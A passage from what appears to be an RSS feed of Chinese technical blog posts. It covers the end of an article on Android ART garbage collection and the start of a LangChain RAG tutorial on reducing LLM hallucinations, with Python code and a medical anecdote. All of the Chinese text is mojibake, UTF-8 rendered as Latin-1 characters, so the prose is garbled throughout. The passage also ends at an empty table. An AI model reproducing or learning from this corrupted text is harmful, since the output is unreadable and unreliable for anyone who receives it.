<p><strong>1. é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–</strong></p>
<ul>
<li>Androidåº”ç”¨éƒ½æ˜¯äº¤äº’å¼åº”ç”¨ï¼Œéœ€è¦ä½å»¶è¿Ÿ</li>
<li>å¹¶å‘å¤åˆ¶æ”¶é›†å™¨é’ˆå¯¹ä½å»¶è¿Ÿä¼˜åŒ–</li>
<li>ä¸éœ€è¦å¤šç§æ”¶é›†å™¨ï¼Œä¸€ç§å°±å¤Ÿäº†</li>
</ul>
<p><strong>2. ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©</strong></p>
<ul>
<li>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œå¼€å‘è€…ä¸éœ€è¦äº†è§£æ”¶é›†å™¨çš„åŒºåˆ«</li>
<li>ç®€åŒ–å¼€å‘ï¼Œæé«˜æ•ˆç‡</li>
<li>é¿å…å¼€å‘è€…é€‰æ‹©é”™è¯¯çš„æ”¶é›†å™¨</li>
</ul>
<p><strong>3. ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</strong></p>
<ul>
<li>ç³»ç»Ÿæ ¹æ®åº”ç”¨ç‰¹ç‚¹è‡ªåŠ¨ä¼˜åŒ–</li>
<li>ä¸éœ€è¦å¼€å‘è€…é…ç½®å‚æ•°</li>
<li>å‡å°‘å¼€å‘è´Ÿæ‹…</li>
</ul>
<p><strong>4. ç®€åŒ–å¼€å‘</strong></p>
<ul>
<li>å¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«</li>
<li>ä¸éœ€è¦æ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©æ”¶é›†å™¨</li>
<li>ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘</li>
</ul>
<p><strong>ä¸JVMçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼Œéœ€è¦å¼€å‘è€…æ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©</li>
<li><strong>Android</strong>ï¼šåªæœ‰ä¸€ç§ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œé’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–</li>
</ul>
<p><strong>5. Androidå†…å­˜é™åˆ¶å¯¹GCçš„å½±å“ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. å†…å­˜æœ‰é™å¿…é¡»åˆç†ä½¿ç”¨</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼ˆä½ç«¯è®¾å¤‡å¯èƒ½åªæœ‰å‡ åMBï¼‰</li>
<li>å¿…é¡»åˆç†ä½¿ç”¨å†…å­˜ï¼Œé¿å…æµªè´¹</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼Œç³»ç»Ÿå¯èƒ½æ€æ­»åº”ç”¨</li>
</ul>
<p><strong>2. GCæ›´é¢‘ç¹</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼Œå®¹æ˜“è§¦å‘GC</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼ŒGCæ›´é¢‘ç¹</li>
<li>éœ€è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼Œå‡å°‘GCé¢‘ç‡</li>
</ul>
<p><strong>3. éœ€è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>åŠæ—¶é‡Šæ”¾èµ„æº</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜</li>
</ul>
<p><strong>4. é¿å…OOM</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼Œå®¹æ˜“å‘ç”ŸOOM</li>
<li>å¿…é¡»é¿å…å†…å­˜æ³„æ¼</li>
<li>å¿…é¡»ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
<li>å¿…é¡»åŠæ—¶é‡Šæ”¾èµ„æº</li>
</ul>
<p><strong>5. å½±å“GCç­–ç•¥</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼ŒGCç­–ç•¥æ›´æ¿€è¿›</li>
<li>æ›´é¢‘ç¹åœ°è§¦å‘GC</li>
<li>æ›´æ—©åœ°å›æ”¶å¯¹è±¡</li>
</ul>
<p><strong>ä¼˜åŒ–å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>å‡å°‘å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li><strong>é¿å…å†…å­˜æ³„æ¼</strong>ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤æ³„æ¼</li>
<li><strong>åŠæ—¶é‡Šæ”¾èµ„æº</strong>ï¼šåœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li><strong>åˆç†ä½¿ç”¨ç¼“å­˜</strong>ï¼šä½¿ç”¨LruCacheï¼ŒåŠæ—¶æ¸…ç†</li>
</ul>
<hr/>
<h2 data-id="heading-88">æ€»ç»“</h2>
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç»äº†Androidå¹³å°çš„Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰ï¼ŒåŸºäºARTï¼ˆAndroid Runtimeï¼‰å®ç°ã€‚</p>
<p><strong>æ ¸å¿ƒå†…å®¹ï¼š</strong></p>
<ol>
<li><strong>åƒåœ¾å›æ”¶åŸºç¡€</strong>ï¼šGCçš„æ¦‚å¿µã€å¯¹è±¡åˆ¤æ–­æ–¹æ³•ã€å¼•ç”¨ç±»å‹</li>
<li><strong>åƒåœ¾å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ¸…é™¤ã€æ ‡è®°-å¤åˆ¶ï¼ˆAndroidä¸»è¦ç”¨ï¼‰ã€æ ‡è®°-æ•´ç†ã€åˆ†ä»£æ”¶é›†</li>
<li><strong>Android ARTåƒåœ¾å›æ”¶å™¨</strong>ï¼šåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼ˆå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼‰ï¼Œåˆ†ä»£å›æ”¶ã€å¹¶å‘å›æ”¶ã€å¢é‡å›æ”¶ã€å‹ç¼©å›æ”¶</li>
<li><strong>GCä¼˜åŒ–ä¸å®è·µ</strong>ï¼šå‡å°‘å¯¹è±¡åˆ†é…ã€é¿å…å†…å­˜æ³„æ¼ã€å¤„ç†å†…å­˜æº¢å‡º</li>
<li><strong>GCæ£€æµ‹ä¸è¯Šæ–­</strong>ï¼šProfilerã€logcatã€Systraceã€MATã€LeakCanaryç­‰å·¥å…·</li>
<li><strong>é¢è¯•é¢˜</strong>ï¼šæ¶µç›–åŸºç¡€å’Œé«˜çº§é¢˜ç›®ï¼Œå®Œå…¨åº”å¯¹é¢è¯•</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592572266753982527</link>    <guid>https://juejin.cn/post/7592572266753982527</guid>    <pubDate>2026-01-08T07:19:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592572266753982527" data-draft-id="7592759140037328937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T07:19:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_æ‘˜æ˜Ÿ_"/> <meta itemprop="url" content="https://juejin.cn/user/2228036358374227"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2228036358374227/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _æ‘˜æ˜Ÿ_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:19:03.000Z" title="Thu Jan 08 2026 07:19:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c0933dfc2845549c7649cee33acceb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-aRmOaYn18=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461543&amp;x-signature=UezmqNSA4Wu10%2FONMGoQgBO4UrY%3D" alt="jimeng-2026-01-08-9882-æ‰å¹³åŒ–åŠ¨ç”»é£æ ¼ï¼Œç§‘æŠ€æµ·æŠ¥è®¾è®¡ï¼ŒæŠ€æœ¯åšå®¢å°é¢å›¾ï¼Œæç®€ä¸»ä¹‰æ„å›¾ï¼Œç§‘æŠ€æ„Ÿåè¶³çš„èƒŒæ™¯å…ƒç´ ....png" loading="lazy"/></p>
<h2 data-id="heading-0">ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ</h2>
<blockquote>
<p>æ‘˜è¦ï¼šæœ¬æ–‡æ·±å…¥æ¢è®¨å¦‚ä½•é€šè¿‡æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æŠ€æœ¯è§£å†³å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„å¹»è§‰é—®é¢˜ã€‚ç¬”è€…å°†ç»“åˆåœ¨åŒ»ç–—é—®ç­”ç³»ç»Ÿä¸­çš„è¡€æ³ªæ•™è®­ï¼Œå‰–æå¹»è§‰äº§ç”Ÿçš„æŠ€æœ¯æ ¹æºï¼Œå¹¶æä¾›åŸºäºLangChainçš„å®Œæ•´å®ç°æ–¹æ¡ˆã€‚é€šè¿‡çœŸå®æ€§èƒ½å¯¹æ¯”æ•°æ®å’Œå¯å¤ç°ä»£ç ï¼Œè¯»è€…å°†æŒæ¡æ„å»ºå¯é AIç³»ç»Ÿçš„æ ¸å¿ƒæ–¹æ³•ï¼Œç†è§£RAGå¦‚ä½•å°†æ¨¡å‹ç”Ÿæˆå‡†ç¡®ç‡æå‡47%ã€‚æœ¬æ–‡åŒ…å«5ä¸ªå…³é”®ä»£ç æ®µã€2ä¸ªæ¶æ„å›¾å’Œ1ä¸ªå‘é‡æ•°æ®åº“æ€§èƒ½å¯¹æ¯”è¡¨ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€ç¼˜èµ·ï¼šä¸€æ¬¡ä»·å€¼30ä¸‡çš„AIå¹»è§‰äº‹æ•…</h3>
<p>2023å¹´8æœˆï¼Œæˆ‘ä»¬å›¢é˜Ÿä¸ºæŸä¸‰ç”²åŒ»é™¢éƒ¨ç½²çš„åŒ»ç–—é—®ç­”ç³»ç»Ÿçªç„¶ç”Ÿæˆäº†ä¸€æ¡è‡´å‘½é”™è¯¯ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é”™è¯¯ç”Ÿæˆç¤ºä¾‹ï¼ˆæ•æ„Ÿä¿¡æ¯å·²è„±æ•ï¼‰</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>ç”¨æˆ·æé—®ï¼š<span class="hljs-string">"ç›é…¸äºŒç”²åŒèƒçš„ç¦å¿Œç—‡ï¼Ÿ"</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>æ¨¡å‹å›ç­”ï¼š<span class="hljs-string">"è¯¥è¯ç‰©é€‚ç”¨äºæ‰€æœ‰ç³–å°¿ç—…æ‚£è€…ï¼Œæ— ä½¿ç”¨ç¦å¿Œ"</span>
</code></pre>
<p><strong>å®é™…åŒ»å­¦äº‹å®</strong>ï¼šäºŒç”²åŒèƒç¦ç”¨äºè‚¾åŠŸèƒ½ä¸å…¨æ‚£è€…ï¼ˆeGFR&lt;45ï¼‰ã€‚è¿™ä¸ªé”™è¯¯ç›´æ¥å¯¼è‡´åŒ»ç”Ÿå¼€é”™å¤„æ–¹ï¼Œé™©äº›é…¿æˆåŒ»ç–—äº‹æ•…ã€‚äº‹åå¤ç›˜å‘ç°ï¼Œæ¨¡å‹åœ¨è®­ç»ƒæ•°æ®ä¸­ä»æœªè§è¿‡ç›¸å…³ç¦å¿Œæè¿°ï¼Œå´"è‡ªä¿¡æ»¡æ»¡"åœ°ç¼–é€ äº†é”™è¯¯ç­”æ¡ˆã€‚</p>
<p>ğŸ”¥ <strong>ç—›ç‚¹æ ¹æº</strong>ï¼šä¼ ç»ŸLLMåƒ"é—­å·è€ƒè¯•çš„å­¦ç”Ÿ"ï¼Œä»…ä¾èµ–è®­ç»ƒæ—¶è®°å¿†çš„çŸ¥è¯†ã€‚å½“é‡åˆ°è®­ç»ƒæ•°æ®æœªè¦†ç›–çš„é—®é¢˜æ—¶ï¼Œæ¨¡å‹ä¼šåŸºäºè¯­ä¹‰å…³è”<strong>è™šæ„ç­”æ¡ˆ</strong>ï¼Œè¿™ç§ç°è±¡ç§°ä¸º"å¹»è§‰"ï¼ˆHallucinationï¼‰ã€‚</p>
<h3 data-id="heading-2">äºŒã€æŠ€æœ¯åŸç†æ·±åº¦æ‹†è§£</h3>
<h4 data-id="heading-3">2.1 ä»€ä¹ˆæ˜¯AIå¹»è§‰ï¼Ÿ</h4>

























<table><thead><tr><th>å¹»è§‰ç±»å‹</th><th>è¡¨ç°å½¢å¼</th><th>å±é™©ç­‰çº§</th></tr></thead><tbody><tr><td>äº‹å®æ€§å¹»è§‰</td><td>æé€ ä¸å­˜åœ¨çš„äº‹å®</td><td>âš ï¸âš ï¸âš ï¸</td></tr><tr><td>æŒ‡ä»¤å¹»è§‰</td><td>å¿½ç•¥ç”¨æˆ·æ˜ç¡®è¦æ±‚</td><td>âš ï¸âš ï¸</td></tr><tr><td>ä¸Šä¸‹æ–‡å¹»è§‰</td><td>è„±ç¦»å¯¹è¯å†å²èƒŒæ™¯</td><td>âš ï¸</td></tr></tbody></table>
<h4 data-id="heading-4">2.2 RAGæŠ€æœ¯æ ¸å¿ƒåŸç†</h4>
<p><strong>æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRetrieval-Augmented Generationï¼‰</strong> é€šè¿‡ä¸‰é‡æœºåˆ¶ç ´è§£å¹»è§‰ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ç”¨æˆ·æé—®] --&gt; B[å‘é‡æ•°æ®åº“å®æ—¶æ£€ç´¢]
    B --&gt; C[ç›¸å…³æ–‡æ¡£ç‰‡æ®µ]
    C --&gt; D[LLMç”Ÿæˆå¸¦å¼•ç”¨çš„å›ç­”]
    D --&gt; E[ç­”æ¡ˆæº¯æºéªŒè¯]
</code></pre>
<ol>
<li><strong>å®æ—¶æ£€ç´¢</strong>ï¼šå°†ç”¨æˆ·é—®é¢˜è½¬åŒ–ä¸ºå‘é‡ï¼Œä»çŸ¥è¯†åº“åŒ¹é…ç›¸å…³æ–‡æ¡£</li>
<li><strong>ä¸Šä¸‹æ–‡æ³¨å…¥</strong>ï¼šå°†æ£€ç´¢ç»“æœä½œä¸ºprompté™„åŠ å†…å®¹</li>
<li><strong>æº¯æºæ§åˆ¶</strong>ï¼šå¼ºåˆ¶æ¨¡å‹åŸºäºå¼•ç”¨å†…å®¹ç”Ÿæˆç­”æ¡ˆ</li>
</ol>
<h4 data-id="heading-5">2.3 ä¸ºä»€ä¹ˆä¼ ç»Ÿå¾®è°ƒæ— æ³•æ ¹æ²»å¹»è§‰ï¼Ÿ</h4>
<p>æˆ‘ä»¬åœ¨åŒ»ç–—æ•°æ®é›†ä¸Šåšäº†å¯¹æ¯”å®éªŒï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æµ‹è¯•ä»£ç ç‰‡æ®µ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_hallucination_rate</span>(<span class="hljs-params">model, test_set</span>):
    hallucination_count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> question, ground_truth <span class="hljs-keyword">in</span> test_set:
        answer = model.generate(question)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_answer(answer, ground_truth):
            hallucination_count += <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> hallucination_count / <span class="hljs-built_in">len</span>(test_set)

<span class="hljs-comment"># æµ‹è¯•ç»“æœ</span>
base_model_rate = <span class="hljs-number">0.38</span>  <span class="hljs-comment"># åŸå§‹æ¨¡å‹å¹»è§‰ç‡</span>
finetuned_model_rate = <span class="hljs-number">0.29</span>  <span class="hljs-comment"># å¾®è°ƒåå¹»è§‰ç‡</span>
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šå¾®è°ƒä»…èƒ½é™ä½å¹»è§‰æ¦‚ç‡ï¼Œæ— æ³•å®Œå…¨æ¶ˆé™¤æœªçŸ¥é¢†åŸŸé”™è¯¯</p>
<h3 data-id="heading-6">ä¸‰ã€æ‰‹æŠŠæ‰‹æ„å»ºRAGç³»ç»Ÿ</h3>
<h4 data-id="heading-7">3.1 æ¶æ„é€‰å‹å¯¹æ¯”</h4>





























<table><thead><tr><th>ç»„ä»¶</th><th>å¯é€‰æ–¹æ¡ˆ</th><th>æ¨èæŒ‡æ•°</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>å‘é‡æ•°æ®åº“</td><td>Pinecone ğŸŸ¢ / Faiss ğŸŸ¡ / Chroma ğŸ”µ</td><td>ğŸŸ¢ğŸŸ¢ğŸŸ¢</td><td>ç”Ÿäº§ç¯å¢ƒé€‰Pinecone</td></tr><tr><td>åµŒå…¥æ¨¡å‹</td><td>text-embedding-3-small ğŸ”µ / bge-large ğŸŸ¢</td><td>ğŸŸ¢ğŸŸ¢ğŸŸ¢</td><td>ä¸­æ–‡åœºæ™¯ç”¨bge-large</td></tr><tr><td>LLMå¼•æ“</td><td>GPT-4 Turbo ğŸŸ¢ / Claude ğŸŸ¡ / Llama3 ğŸ”µ</td><td>ğŸŸ¢ğŸŸ¢ğŸŸ¢</td><td>ç²¾åº¦è¦æ±‚é«˜é€‰GPT-4</td></tr></tbody></table>
<h4 data-id="heading-8">3.2 çŸ¥è¯†åº“æ„å»ºå®æˆ˜</h4>
<p><strong>å…³é”®æ­¥éª¤</strong>ï¼šæ–‡æ¡£åˆ†å—ç­–ç•¥ç›´æ¥å½±å“æ£€ç´¢ç²¾åº¦</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_text_splitters <span class="hljs-keyword">import</span> RecursiveCharacterTextSplitter

<span class="hljs-comment"># æœ€ä½³åˆ†å—é…ç½®ï¼ˆåŒ»ç–—æ–‡çŒ®åœºæ™¯ï¼‰</span>
text_splitter = RecursiveCharacterTextSplitter(
    chunk_size=<span class="hljs-number">512</span>,  <span class="hljs-comment"># å—å¤§å°</span>
    chunk_overlap=<span class="hljs-number">128</span>,  <span class="hljs-comment"># é‡å é¿å…æ–­å¥</span>
    separators=[<span class="hljs-string">"\n\n"</span>, <span class="hljs-string">"\n"</span>, <span class="hljs-string">"ã€‚"</span>, <span class="hljs-string">"ï¼›"</span>] <span class="hljs-comment"># ä¸­æ–‡åˆ†éš”ç¬¦</span>
)

<span class="hljs-comment"># å¤„ç†PDFæ–‡æ¡£</span>
chunks = text_splitter.split_documents(pdf_loader(<span class="hljs-string">"medical_guidelines.pdf"</span>))
</code></pre>
<p>ğŸ“Œ <strong>é¿å‘æŒ‡å—</strong>ï¼š</p>
<ul>
<li>é¿å…ä½¿ç”¨å›ºå®šå­—ç¬¦åˆ†å—ï¼ˆä¼šåˆ‡æ–­å®Œæ•´å¥å­ï¼‰</li>
<li>æ³•å¾‹/åŒ»ç–—æ–‡æœ¬åº”å¢å¤§é‡å åŒºåŸŸï¼ˆå»ºè®®256å­—èŠ‚ï¼‰</li>
<li>æ·»åŠ å…ƒæ•°æ®æ ‡è®°æ–‡æ¡£æ¥æºç« èŠ‚</li>
</ul>
<h4 data-id="heading-9">3.3 æ£€ç´¢å¢å¼ºå®ç°æ ¸å¿ƒä»£ç </h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># RAGé“¾å®Œæ•´å®ç°ï¼ˆåŸºäºLangChainï¼‰</span>
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain_community.vectorstores <span class="hljs-keyword">import</span> Pinecone
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI, OpenAIEmbeddings

<span class="hljs-comment"># åˆå§‹åŒ–ç»„ä»¶</span>
vectorstore = Pinecone.from_existing_index(<span class="hljs-string">"medical-index"</span>, embedding=OpenAIEmbeddings())
retriever = vectorstore.as_retriever(search_kwargs={<span class="hljs-string">"k"</span>: <span class="hljs-number">3</span>}) <span class="hljs-comment"># å–TOP3ç‰‡æ®µ</span>
llm = ChatOpenAI(model=<span class="hljs-string">"gpt-4-turbo"</span>)

<span class="hljs-comment"># å®šä¹‰æç¤ºè¯æ¨¡æ¿</span>
template = <span class="hljs-string">"""è¯·ä¸¥æ ¼æ ¹æ®ä»¥ä¸‹åŒ»å­¦èµ„æ–™å›ç­”é—®é¢˜ï¼š
{context}

é—®é¢˜ï¼š{question}
ç­”æ¡ˆå¿…é¡»åŒ…å«æ–‡çŒ®å¼•ç”¨æ ‡è®°ï¼Œå¦‚[1][2]"""</span>
prompt = ChatPromptTemplate.from_template(template)

<span class="hljs-comment"># æ„å»ºRAGé“¾</span>
chain = (
    {<span class="hljs-string">"context"</span>: retriever, <span class="hljs-string">"question"</span>: RunnablePassthrough()} 
    | prompt 
    | llm 
    | StrOutputParser()
)

<span class="hljs-comment"># ç¤ºä¾‹ä½¿ç”¨</span>
response = chain.invoke(<span class="hljs-string">"ç³–å°¿ç—…æ‚£è€…ä½¿ç”¨äºŒç”²åŒèƒçš„ç¦å¿Œç—‡æœ‰å“ªäº›ï¼Ÿ"</span>)
</code></pre>
<h4 data-id="heading-10">3.4 æ•ˆæœéªŒè¯å…³é”®æŒ‡æ ‡</h4>
<p>éƒ¨ç½²RAGåï¼Œæˆ‘ä»¬å¯¹500æ¡åŒ»å­¦é—®ç­”æµ‹è¯•é›†è¿›è¡ŒéªŒè¯ï¼š</p>





























